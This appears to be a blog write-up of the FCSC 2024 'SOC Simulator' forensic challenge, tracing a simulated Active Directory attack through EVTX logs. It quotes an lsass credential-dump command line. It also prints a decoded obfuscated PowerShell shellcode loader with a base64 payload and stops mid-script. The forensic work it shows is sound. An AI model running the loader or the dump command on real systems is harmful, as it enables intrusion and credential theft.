<!DOCTYPE html>
<html lang="en-us">
<head>
  <script defer data-domain="itarow.xyz" src="https://plausible.itarow.xyz/js/plausible.js"></script>
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> FCSC 2024 - SOC Simulator serie - Forensic | Itarow</title>
  <link rel = 'canonical' href = 'https://blog.itarow.xyz/posts/fcsc2024_soc_simulator/'>
  <meta name="description" content="CS student, writing some write up of cool CTF&#39;s challenges and infosec content.">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="FCSC 2024 - SOC Simulator serie - Forensic" />
<meta property="og:description" content="This is the write-up of SOC Simulator challenge which was in the Forensic category for the FCSC 2024. It involves EVTX analysis of a Windows Active Directory where an attack occurred. Our goal is to find the various steps taken by the attacker.
Description Common introduction to the SOC Simulator series
In the summer of 2022, an operator of vital importance (OIV) alerts the ANSSI because it believes it is the victim of a major cyber attack." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://blog.itarow.xyz/posts/fcsc2024_soc_simulator/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-04-14T22:11:42+02:00" />
<meta property="article:modified_time" content="2024-04-14T22:11:42+02:00" />

  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="FCSC 2024 - SOC Simulator serie - Forensic"/>
<meta name="twitter:description" content="This is the write-up of SOC Simulator challenge which was in the Forensic category for the FCSC 2024. It involves EVTX analysis of a Windows Active Directory where an attack occurred. Our goal is to find the various steps taken by the attacker.
Description Common introduction to the SOC Simulator series
In the summer of 2022, an operator of vital importance (OIV) alerts the ANSSI because it believes it is the victim of a major cyber attack."/>

  
  
    
  
  
  <link rel="stylesheet" href="https://blog.itarow.xyz/css/styles.4dd8e96d6c0d53a6965a5a357c26fc29f6b838ad352dc5acda0754ff4b9409e5c58fa94716892c2a5d6a7e1b1bef8fbcaf2442656e81dfae00dc9464d707477d.css" integrity="sha512-TdjpbWwNU6aWWlo1fCb8Kfa4OK01LcWs2gdU/0uUCeXFj6lHFoksKl1qfhsb74&#43;8ryRCZW6B364A3JRk1wdHfQ=="> 

  
  
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="https://blog.itarow.xyz/images/favicon.ico" />

  
  
</head>

<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

  <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/categories">Categories</a></li>
         
        <li><a href="/whoami">Whoami</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li>
          <a class="icon" href=" https://blog.itarow.xyz/posts/l_an_1_et_puis_l_an_2/" aria-label="Previous">
            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
          </a>
        </li>
        
        
        <li>
          <a class="icon" href="https://blog.itarow.xyz/posts/fcsc2024_hashed_shellcode/" aria-label="Next">
            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
          </a>
        </li>
        
        <li>
          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
          </a>
        </li>
        <li>
          <a class="icon" href="#" aria-label="Share">
            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
          </a>
        </li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_soc_simulator%2f" aria-label="Facebook">
      <i class="fab fa-facebook " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_soc_simulator%2f&text=FCSC%202024%20-%20SOC%20Simulator%20serie%20-%20Forensic" aria-label="Twitter">
      <i class="fab fa-twitter " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_soc_simulator%2f&title=FCSC%202024%20-%20SOC%20Simulator%20serie%20-%20Forensic" aria-label="Linkedin">
      <i class="fab fa-linkedin " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_soc_simulator%2f&is_video=false&description=FCSC%202024%20-%20SOC%20Simulator%20serie%20-%20Forensic" aria-label="Pinterest">
      <i class="fab fa-pinterest " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=FCSC%202024%20-%20SOC%20Simulator%20serie%20-%20Forensic&body=Check out this article: https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_soc_simulator%2f" aria-label="Email">
      <i class="fas fa-envelope " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_soc_simulator%2f&title=FCSC%202024%20-%20SOC%20Simulator%20serie%20-%20Forensic" aria-label="Pocket">
      <i class="fab fa-get-pocket " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_soc_simulator%2f&title=FCSC%202024%20-%20SOC%20Simulator%20serie%20-%20Forensic" aria-label="reddit">
      <i class="fab fa-reddit " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_soc_simulator%2f&name=FCSC%202024%20-%20SOC%20Simulator%20serie%20-%20Forensic&description=This%20is%20the%20write-up%20of%20SOC%20Simulator%20challenge%20which%20was%20in%20the%20Forensic%20category%20for%20the%20FCSC%202024.%20It%20involves%20EVTX%20analysis%20of%20a%20Windows%20Active%20Directory%20where%20an%20attack%20occurred.%20Our%20goal%20is%20to%20find%20the%20various%20steps%20taken%20by%20the%20attacker.%0aDescription%20Common%20introduction%20to%20the%20SOC%20Simulator%20series%0aIn%20the%20summer%20of%202022%2c%20an%20operator%20of%20vital%20importance%20%28OIV%29%20alerts%20the%20ANSSI%20because%20it%20believes%20it%20is%20the%20victim%20of%20a%20major%20cyber%20attack." aria-label="Tumblr">
      <i class="fab fa-tumblr " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2024_soc_simulator%2f&t=FCSC%202024%20-%20SOC%20Simulator%20serie%20-%20Forensic" aria-label="Hacker News">
      <i class="fab fa-hacker-news " aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>
    
    <div id="toc">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#description">Description</a></li>
    <li><a href="#resolution">Resolution</a>
      <ul>
        <li><a href="#step-1---initial-vector">Step 1 - Initial vector</a></li>
        <li><a href="#step-2---stealing-secrets-1">Step 2 - Stealing secrets 1</a></li>
        <li><a href="#step-5---stealing-secrets-2">Step 5 - Stealing secrets 2</a></li>
        <li><a href="#step-4---lateralization">Step 4 - Lateralization</a></li>
        <li><a href="#step-3---exfiltration">Step 3 - Exfiltration</a>
          <ul>
            <li><a href="#rabbit-hole---undestand-powershell-payloads">Rabbit hole - Undestand powershell payloads</a></li>
            <li><a href="#the-right-way">The right way</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ul>
</nav>
    </div>
    
  </span>
</div>


  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
    <header>
      <h1 class="posttitle" itemprop="name headline">
        FCSC 2024 - SOC Simulator serie - Forensic
      </h1>
      <div class="meta">
        
        <div class="postdate">
          
          <time datetime="2024-04-14 22:11:42 &#43;0200 CEST" itemprop="datePublished">2024-04-14</time>
          
        </div>
        
        
        <div class="article-read-time">
          <i class="far fa-clock"></i>
          
          10 minute read
        </div>
        
        
        <div class="article-category">
            <i class="fas fa-archive"></i>
            
            
            <a class="category-link" href="/categories/fcsc2024">FCSC2024</a>
            
        </div>
        
        
      </div>
    </header>

  
    
    <div class="content" itemprop="articleBody">
      <p>This is the write-up of SOC Simulator challenge which was in the Forensic category for the FCSC 2024. It involves EVTX analysis of a Windows Active Directory where an attack occurred. Our goal is to find the various steps taken by the attacker.</p>
<h2 id="description">Description</h2>
<blockquote>
<p>Common introduction to the SOC Simulator series</p>
</blockquote>
<p>In the summer of 2022, an operator of vital importance (OIV) alerts the ANSSI because it believes it is the victim of a major cyber attack. The OIV&rsquo;s security operation center (SOC) sends ANSSI an export of its system collection over the last few days. Your job is to understand the attacker&rsquo;s actions.</p>
<p>Note: The 5 parts are numbered in the chronological order of the attack, but it is not necessary to solve them in order.</p>
<p>File : soc_events.zip (EVTX files)</p>
<h2 id="resolution">Resolution</h2>
<h3 id="step-1---initial-vector">Step 1 - Initial vector</h3>
<pre tabindex="0"><code>Find the name of the vulnerability and the UTC time of the first attempt to exploit it.

Flag format (case insensitive): FCSC{EternalBlue|2021-11-27T17:38}
</code></pre><p>So our goal is to find how the attacker entered in the network of the AD (Active Directory). We have the EVTX log files of the Active Directory during three days.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ ls
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">20220704</span>  <span style="color:#ae81ff">20220705</span>  <span style="color:#ae81ff">20220706</span>
</span></span><span style="display:flex;"><span>$ ls -l <span style="color:#ae81ff">20220704</span> <span style="color:#ae81ff">20220705</span> <span style="color:#ae81ff">20220706</span> | wc -l
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">458</span>
</span></span></code></pre></div><p>There are many files, which I sorted by date in each directory. To view the content of the EVTX files we could use the Windows utility to view them, but it would be a pain to open them all in a row and try to find something by magic.</p>
<p>So we could use a tool to parse/analyse the EVTX files with some rules and get a cool CSV to be analyzed by us. There are some tools to do that, for exemple <a href="https://github.com/Yamato-Security/hayabusa">hayabusa</a> and <a href="https://github.com/WithSecureLabs/chainsaw">chainsaw</a>. In my case, I used hayabusa which is helpfull.</p>
<p>Basic command :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ ~/Tools/hayabusa/hayabusa-2.13.0-lin-x64-gnu csv-timeline -d ~/Share-VMs/win/soc_events/ -o ~/Share-VMs/win/all.csv
</span></span></code></pre></div><p>We only have to take care of the level of rules we are going to set. It will change the content and the informations. In my case, I first used only critical and high level criticity rules but after I saw that I had lost some information, I decided to put almost all the rules to the CV.</p>
<p>So now we have multiples CSVs to analyze (I made one CSV by day to be more precise and facilitate the analysis). To view it, we could use <a href="https://f001.backblazeb2.com/file/EricZimmermanTools/net6/TimelineExplorer.zip">TimelineExplorer</a> which is easy to set rules and view the CV correctly.</p>
<p>Now we have a nice setup to start the analysis.</p>
<p>I first sort by criticity level of detection to see if there are critical event alerts.</p>
<p><img src="/img/soc_simulator/1.png" alt=""></p>
<p>We could see that on July 5, there was a Windows Defender alert that says there was an exploitation of the CVE-2021-31207 aka ProxyShell vulnerability. This exploitation occurs on the exchange server (Windows Mail server). So I first thought this was the time of the exploitation but It wasn&rsquo;t. This alert occurs several hours later, after the real exploitation moment. I could find the same alert on July 6 at same hour. So It was basically a scheduled task scan of Windows Defender.</p>
<p>But we have a hint, there are many chances this is a ProxyShell vulnerability that was exploited. It&rsquo;s recent and was hugely exploited when It was discovered.</p>
<p>ProxyShell abuse of the <code>New-MailboxExportRequest</code> (<a href="https://news.sophos.com/en-us/2021/08/23/proxyshell-vulnerabilities-in-microsoft-exchange-what-to-do/">https://news.sophos.com/en-us/2021/08/23/proxyshell-vulnerabilities-in-microsoft-exchange-what-to-do/</a>) so we could search if there are some suspicions.</p>
<p><img src="/img/soc_simulator/2.png" alt=""></p>
<p>We have two export requests, which look really suspicious. When I did the challenge, I didn&quot;t notice the level of the event, but hayabusa detected It with its rules as critical and &ldquo;Mail Export to Exchange WebServer&rdquo;.</p>
<p>If we google the path used for the aspx <code>C$\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth</code></p>
<p>We quickly <a href="https://sec-consult.com/blog/detail/microsoft-exchange-server-zero-day-exploit/">find</a> that is this associated with a webshell insertion on the exchange server, which now allows the attacker to execute command on the server and get the initial access.</p>
<p>So we have the flag for the first step, there are two export but we only need the first in time.</p>
<p>Flag : <code>FCSC{ProxyShell|2022-07-04T15:36}</code></p>
<h3 id="step-2---stealing-secrets-1">Step 2 - Stealing secrets 1</h3>
<pre tabindex="0"><code>After the action seen in Part 1, the attacker steals the system credentials from memory.Find the GUID of the process performing this theft and the name of the file where it writes the stolen secrets.

Flag format (case insensitive): FCSC{6ccf8905-a033-4edc-8ed7-0a4b0a411e15|C:\Windows\Users\toto\Desktop\fichier.pdf}
</code></pre><p>Now we have to find out how the attacker found credentials. We have the information that this was with memory. So we could quickly think that the attacker dumped the lsass memory to find the credentials.</p>
<p>The parsed CSV by hayabusa gives us the information very quickly, with the high level detection there is this:</p>
<p><img src="/img/soc_simulator/3.png" alt=""></p>
<p>This command : <code>&quot;C:\Windows\system32\rundll32.exe&quot; C:\Windows\System32\comsvcs.dll MiniDump 652 attr.exe full</code> was executed on the exchange server approximately 10 minutes after the webshell insertion.</p>
<p>If we google the comsvcs.dll we quickly find his lolbas page : <a href="https://lolbas-project.github.io/lolbas/Libraries/comsvcs/">https://lolbas-project.github.io/lolbas/Libraries/comsvcs/</a> . This DLL could be used to dump a process memory using is function <code>MiniDump</code>. The PID is specified, and the file name result also, in our case, it&rsquo;s <code>attr.exe</code>.</p>
<p>We have the GUID in an event : <code>b99a131f-0d4b-62c3-ce03-00000000db0</code></p>
<p>Now we need to find the Directory where the attr.exe file was dropped.</p>
<p>This information was not present in the CSV, so I decided to see with the window&rsquo;s event viewer. Just using grep like this, we could find the evtx associated with:</p>
<pre tabindex="0"><code>rg -i &#34;attr.exe&#34; --binary -E UTF-16 ~/Share-VMs/win/soc_events/
~/Share-VMs/win/soc_events/20220704/20220704T175527.evtx: binary file matches (found &#34;\0&#34; byte around offset 10)
</code></pre><p>And read the event at the right time :</p>
<p><img src="/img/soc_simulator/4.png" alt=""></p>
<p><code>C:\Windows\System32\inetsrv\</code> was the directory when the command was executed.
Flag : <code>FCSC{b99a131f-0d4b-62c3-ce03-00000000db01|C:\Windows\System32\inetsrv\attr.exe}</code></p>
<h3 id="step-5---stealing-secrets-2">Step 5 - Stealing secrets 2</h3>
<pre tabindex="0"><code>On the machine identified in part 4, the attacker again steals system secrets. Find the GUID of the process carrying out this theft and the name of the file where he writes the stolen secrets.

Flag format (case insensitive): FCSC{6ccf8905-a033-4edc-8ed7-0a4b0a411e15|C:\Windows\Users\toto\Desktop\fichier.pdf}.
</code></pre><p>Let&rsquo;s jump into step 5 directly because It was easier than the 3rd and 4th steps.</p>
<p>The machine identified in part 4 is the Workstation2 (from the description). So we need to find an another memory dump of the lsass process.</p>
<p><img src="/img/soc_simulator/5.png" alt=""></p>
<p>There are MSF alert rules that were triggered by windows defender on the Workstation2, so we could guess the lsass dump should be near this moment.</p>
<p>Filtering the csv with TimelineExplorer on the machine Workstation2 and scrolling a bit, we could find this.
<img src="/img/soc_simulator/6.png" alt=""></p>
<p>So we have the path (&ldquo;lsass.DMP&rdquo; file can&rsquo;t be legit) <code>C:\Users\Administrator\AppData\Local\Temp\3\lsass.DMP}</code>, now we need to find out how the dump occurs.</p>
<p>A strings and grep is enough :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ rg <span style="color:#e6db74">&#34;lsass.DMP&#34;</span> --binary -E UTF-16 <span style="color:#ae81ff">20220704</span> <span style="color:#ae81ff">20220705</span> <span style="color:#ae81ff">20220706</span>
</span></span><span style="display:flex;"><span>20220706/20220706T180641.evtx: binary file matches <span style="color:#f92672">(</span>found <span style="color:#e6db74">&#34;\0&#34;</span> byte around offset 10<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>20220706/20220706T181946.evtx: binary file matches <span style="color:#f92672">(</span>found <span style="color:#e6db74">&#34;\0&#34;</span> byte around offset 10<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>$ strings -el 20220706/20220706T180641.evtx | grep -C <span style="color:#ae81ff">5</span> <span style="color:#e6db74">&#34;lsass.DMP&#34;</span>
</span></span><span style="display:flex;"><span>        ProcessId
</span></span><span style="display:flex;"><span>RuleName
</span></span><span style="display:flex;"><span>UtcTime
</span></span><span style="display:flex;"><span>2022-07-06 16:05:01.901
</span></span><span style="display:flex;"><span>ProcessGuid
</span></span><span style="display:flex;"><span>&amp;<span style="color:#f92672">{</span>b7e8a6b7-b273-62c5-bc11-00000000d301<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        ProcessId
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6744</span>
</span></span><span style="display:flex;"><span>Image
</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\t</span>askmgr.exe
</span></span><span style="display:flex;"><span>TargetFilename
</span></span><span style="display:flex;"><span>0C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>DMINI~1<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\L</span>ocal<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\3\l</span>sass.DMP
</span></span><span style="display:flex;"><span>CreationUtcTime
</span></span><span style="display:flex;"><span>2022-07-06 16:05:01.901
</span></span><span style="display:flex;"><span>User
</span></span><span style="display:flex;"><span>WORKSTATION2<span style="color:#ae81ff">\A</span>dministrator
</span></span><span style="display:flex;"><span>5http://schemas.microsoft.com/win/2004/08/events/event
</span></span><span style="display:flex;"><span>Microsoft-Windows-Sysmon
</span></span><span style="display:flex;"><span>&amp;<span style="color:#f92672">{</span>5770385f-c22a-43e0-bf4c-06f5698ffbd9<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>0x8000000000000000
</span></span><span style="display:flex;"><span>2022-07-06T16:05:02.308540600Z
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">36598</span>
</span></span></code></pre></div><p>Remember to strings with the <code>el</code> option because strings are in UTF-16 in EVTX.</p>
<p>We see the <code>C:\Windows\system32\taskmgr.exe</code> path which is the task manager of Windows, so basically, the attacker opened the taskmanager and created a memory dump of the lsass process with a right click.</p>
<p>So we have the flag :
<code>FCSC{b7e8a6b7-b273-62c5-bc11-00000000d301|C:\Users\Administrator\AppData\Local\Temp\3\lsass.DMP}</code></p>
<h3 id="step-4---lateralization">Step 4 - Lateralization</h3>
<pre tabindex="0"><code>Over a short period of time, the attacker tried to connect to numerous machines, as if trying to reuse the secrets stolen in part 2. This enabled him to connect to the Workstation2 machine. Find the source IP, the account used and the UTC time of this connection.

Flag format (case insensitive): FCSC{192.168.42.27|MYCORP\Technician|2021-11-27T17:38:54}.
</code></pre><p>Regarding the description, there were bruteforce which could be seen in the EVTX. EVTX contains event IDs that describe the type of the event. We could use this to know when a user was logged on and when a user failed his logon.</p>
<p>The fail logon event ID is the <a href="https://www.manageengine.com/products/active-directory-audit/kb/windows-security-log-event-id-4625.html">4625</a>. We could set a rule on Timeline Explorer to observe them.</p>
<p><img src="/img/soc_simulator/7.png" alt=""></p>
<p>There was a failed logon with a wrong password on the Workstation2 with the user ben.bidon. It confused me during the resolution because It was the only failed logon with a domain user on the Workstation2 machine. The user was logged on just after the failed logon but It could be legit, and It was because It wasn&rsquo;t the flag&hellip;</p>
<p>There is no sign of brute force around this failed password, but here:</p>
<p><img src="/img/soc_simulator/8.png" alt=""></p>
<p>There is a failed password with multiples machines in a time range of one second, looks clearly like a brute force of the Administrator (local machine user).
We could change the filter to also take the logon event id (4624) and see if a connexion succeeds in this time range.</p>
<p><img src="/img/soc_simulator/9.png" alt=""></p>
<p>A few minutes later, there is a another bruteforce like the first one, but this time Workstation2 returns a Logon and not a failure, so this time the spraying password worked and the attacker is logged in.</p>
<p>We could find the IP address and the account in the event description related.</p>
<p>Flag : <code>FCSC{172.16.20.20|WORKSTATION2\Administrator|2022-07-06T13:26:57}</code></p>
<h3 id="step-3---exfiltration">Step 3 - Exfiltration</h3>
<pre tabindex="0"><code>Following on from what we saw earlier, the attacker has collected a large amount of business data. Find the command used to collect all these elements.

Flag format: FCSC{sha256(&lt;command in UTF8 without line feed&gt;)}

For example, if the malicious command was 7z a &#34;Stolen files.zip&#34; C:\Windows\System32, the flag would be FCSC{bc5640e69c335a8dbe369db382666070e05198a6c18ce88498563d2c4ac187b1}.
</code></pre><p>In the last part, we need to find an exfiltration of data, especially the command which allows to get the buisness data.</p>
<p>We know it&rsquo;s &ldquo;Following on from what we saw earlier&rdquo; so we could assume this command was runned on the exchange server.</p>
<p>To get the commands we could filter the data value of the csv with &ldquo;Cmdline:&rdquo;</p>
<p>Quickly come across those supsicious powershell commands:</p>
<p><img src="/img/soc_simulator/10.png" alt=""></p>
<h4 id="rabbit-hole---undestand-powershell-payloads">Rabbit hole - Undestand powershell payloads</h4>
<p>Here is one of the commands extracted:
<img src="/img/soc_simulator/11.png" alt=""></p>
<p>Looks obfuscated. We could extract it and put it on Virus Total, confirmed it&rsquo;s malicious and flagged by some rules. It could be a known sample of a variant. There were three commands like this, which are malicious.</p>
<p>Let&rsquo;s take it and try to decode It.</p>
<p><img src="/img/soc_simulator/12.png" alt=""></p>
<p>In red, we could see keywords. We know it may be a sort of first stage, so it&rsquo;s going to decode some data and run a second stage. There is a base64 decode and a GZIP decode. We could try to reconstruct the base64, it&rsquo;s a bit obfuscated with <code>{1}{2}{3}</code> symbols.</p>
<p><img src="/img/soc_simulator/13.png" alt=""></p>
<p>Here is how the base64 is reconstructed, it replaces the 1 2 3 variables with the next 3 characters (in red).</p>
<p><img src="/img/soc_simulator/14.png" alt=""></p>
<p>Quick python script on we obtain the stage 2 :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> xTk {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">Param</span> ($v3H, $mIBhs)
</span></span><span style="display:flex;"><span>        $oE = ([<span style="color:#66d9ef">AppDomain</span>]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache <span style="color:#f92672">-And</span> $_.Location.Split(<span style="color:#e6db74">&#39;\\&#39;</span>)[<span style="color:#ae81ff">-1</span>].Equals(<span style="color:#e6db74">&#39;System.dll&#39;</span>) }).GetType(<span style="color:#e6db74">&#39;Microsoft.Win32.UnsafeNativeMethods&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $oE.GetMethod(<span style="color:#e6db74">&#39;GetProcAddress&#39;</span>, [<span style="color:#66d9ef">Type[]</span>]@([<span style="color:#66d9ef">System.Runtime.InteropServices.HandleRef], [String</span>])).Invoke($null, @([<span style="color:#66d9ef">System.Runtime.InteropServices.HandleRef</span>](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($oE.GetMethod(<span style="color:#e6db74">&#39;GetModuleHandle&#39;</span>)).Invoke($null, @($v3H)))), $mIBhs))
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> cSp_ {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">Param</span> (
</span></span><span style="display:flex;"><span>                [Parameter(<span style="color:#a6e22e">Position</span> = <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">Mandatory</span> = $True)] [<span style="color:#66d9ef">Type[]</span>] $oK7,
</span></span><span style="display:flex;"><span>                [Parameter(<span style="color:#a6e22e">Position</span> = <span style="color:#ae81ff">1</span>)] [<span style="color:#66d9ef">Type</span>] $t3_ = [<span style="color:#66d9ef">Void</span>]
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        $f_ = [<span style="color:#66d9ef">AppDomain</span>]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(<span style="color:#e6db74">&#39;ReflectedDelegate&#39;</span>)), [<span style="color:#66d9ef">System.Reflection.Emit.AssemblyBuilderAccess</span>]::Run).DefineDynamicModule(<span style="color:#e6db74">&#39;InMemoryModule&#39;</span>, $false).DefineType(<span style="color:#e6db74">&#39;MyDelegateType&#39;</span>, <span style="color:#e6db74">&#39;Class, Public, Sealed, AnsiClass, AutoClass&#39;</span>, [<span style="color:#66d9ef">System.MulticastDelegate</span>])
</span></span><span style="display:flex;"><span>        $f_.DefineConstructor(<span style="color:#e6db74">&#39;RTSpecialName, HideBySig, Public&#39;</span>, [<span style="color:#66d9ef">System.Reflection.CallingConventions</span>]::Standard, $oK7).SetImplementationFlags(<span style="color:#e6db74">&#39;Runtime, Managed&#39;</span>)
</span></span><span style="display:flex;"><span>        $f_.DefineMethod(<span style="color:#e6db74">&#39;Invoke&#39;</span>, <span style="color:#e6db74">&#39;Public, HideBySig, NewSlot, Virtual&#39;</span>, $t3_, $oK7).SetImplementationFlags(<span style="color:#e6db74">&#39;Runtime, Managed&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $f_.CreateType()
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">Byte[]</span>]$c4RI = [<span style="color:#66d9ef">System.Convert</span>]::FromBase64String(<span style="color:#e6db74">&#34;/EiD5PDozAAAAEFRQVBSUUgx0mVIi1JgSItSGFZIi1IgSItyUE0xyUgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCBJAdCLSBhQ41ZNMclI/8lBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCADCAEsBdVkFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0DEn/znXlaPC1olb/1UiD7BBIieJNMclqBEFYSIn5QboC2chf/9VIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//VSAHDSCnGSIX2deFB/+c=&#34;</span>)
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">Uint32</span>]$ixB6 = <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>$bEeFY = [<span style="color:#66d9ef">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((xTk kernel32.dll VirtualAlloc), (cSp_ @([<span style="color:#66d9ef">IntPtr], [UInt32], [UInt32], [UInt32</span>]) ([<span style="color:#66d9ef">IntPtr</span>]))).Invoke([<span style="color:#66d9ef">IntPtr</span>]::Zero, $c4RI.Length,0x3000, 0x04)
</span></span><span style="display:flex;"><span>
